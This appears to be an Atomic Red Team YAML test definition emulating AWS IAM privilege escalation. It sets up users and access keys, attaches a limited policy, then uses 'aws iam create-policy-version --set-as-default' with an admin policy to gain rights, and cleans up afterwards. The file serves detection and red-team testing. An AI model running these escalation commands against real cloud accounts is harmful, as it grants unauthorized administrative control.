attack_technique: TA0004.001
display_name: AWS Privilege Escalation using CreatePolicyVersion
atomic_tests:
- name: Setup Requirements 
  auto_generated_guid: 8822c3b0-d9f9-4daf-a043-49f460a31122
  description: |
    Setting up a user, group, add user to group and create access keys
  supported_platforms:
  - macos
  - linux
  input_arguments:
    username:
      description: Username of the IAM user to create
      type: String
      default: "AtomicRedTeam"
    test_username:
      description: Username of the IAM user to test and verify the attack
      type: String
      default: "AtomicRedTeam_Test"
  executor:
    command: |
      echo "creating new user and group and add user to group"
      aws iam create-user --user-name #{username} 
      aws iam create-user --user-name #{test_username}
      aws iam create-group --group-name #{username}
      aws iam add-user-to-group --user-name #{username} --group-name #{username}
      aws iam create-access-key --user-name #{username} > $PathToAtomicsFolder/TA0004.001/bin/aws_secret.creds
      cd $PathToAtomicsFolder/TA0004.001/bin/
      ./aws_secret.sh
   
    name: sh

- name: Add default policy with limited permissions
  auto_generated_guid: 882211b0-d9f9-4daf-a043-49f460211114
  description: |
    Adding default policy with limited permission
  supported_platforms:
  - macos
  - linux
  input_arguments:
    username:
      description: Username of the user to create
      type: String
      default: "AtomicRedTeam"
    test_username:
      description: Username of the IAM user to test and verify the attack
      type: String
      default: "AtomicRedTeam_Test"
    aws_account_id:
      description: AWS ACCOUNT ID
      type: String
      default: "591511147606"
  executor:
    command: |
      aws iam create-policy --policy-name #{username} --policy-document file://$PathToAtomicsFolder/TA0004.001/src/default_policy.json
      aws iam attach-group-policy --policy-arn arn:aws:iam::#{aws_account_id}:policy/#{username} --group-name #{username}
      echo "-------------------------------------\n\n\n"
      echo "-------------------------------------\n\n\n"
      echo "Before Escalation - Verifing that the current permissions DO NOT allow adding a user to a group"
      aws iam add-user-to-group --group-name #{username} --user-name #{test_username} --profile #{username}
      echo "-------------------------------------\n\n\n"
      echo "-------------------------------------\n\n\n"
    name: sh

- name: Escalate Privileges using CreatePolicyVersion 
  auto_generated_guid: 8822c3b0-d9f9-4daf-a043-49f460236114
  description: |
    Users with the iam:CreatePolicyVersion permission are allowed to create a new version of an existing policy. Consequently, they can create a policy that allows more permissions than what they currently have.
  supported_platforms:
  - macos
  - linux
  input_arguments:
    username:
      description: Username of the user to create
      type: String
      default: "AtomicRedTeam"
    test_username:
      description: Username of the IAM user to test and verify the attack
      type: String
      default: "AtomicRedTeam_Test"
    aws_account_id:
      description: AWS ACCOUNT ID
      type: String
      default: "591511147606"
  executor:
    command: |
      aws iam create-policy-version --policy-arn arn:aws:iam::#{aws_account_id}:policy/#{username} --policy-document file://$PathToAtomicsFolder/TA0004.001/src/admin_policy.json --set-as-default
      sleep 10
      aws iam add-user-to-group --group-name #{username} --user-name #{test_username} --profile #{username}
      echo "-------------------------------------\n\n\n"
      echo "-------------------------------------\n\n\n"
      echo "After Escalation- Added user #{test_username} successfully to group #{username}"
      echo "AWS Api call Return Code " - $?
      echo "Privilege Escalation Successful!"
      echo "-------------------------------------\n\n\n"
      echo "-------------------------------------\n\n\n"

    cleanup_command: |
      access_key=`cat $PathToAtomicsFolder/TA0004.001/bin/aws_secret.creds| jq -r '.AccessKey.AccessKeyId'`
      aws iam delete-access-key --access-key-id $access_key --user-name #{username}
      aws iam remove-user-from-group --user-name #{username} --group-name #{username}
      aws iam remove-user-from-group --user-name #{test_username} --group-name #{username}
      aws iam detach-group-policy --group-name #{username} --policy-arn arn:aws:iam::#{aws_account_id}:policy/#{username}
      aws iam delete-user --user-name #{username}
      aws iam delete-user --user-name #{test_username}
      aws iam delete-group --group-name #{username}
      aws iam delete-policy-version --policy-arn arn:aws:iam::#{aws_account_id}:policy/#{username} --version-id v1
      aws iam delete-policy --policy-arn arn:aws:iam::#{aws_account_id}:policy/#{username}
      rm $PathToAtomicsFolder/TA0004.001/bin/aws_secret.creds
    name: sh
    elevation_required: false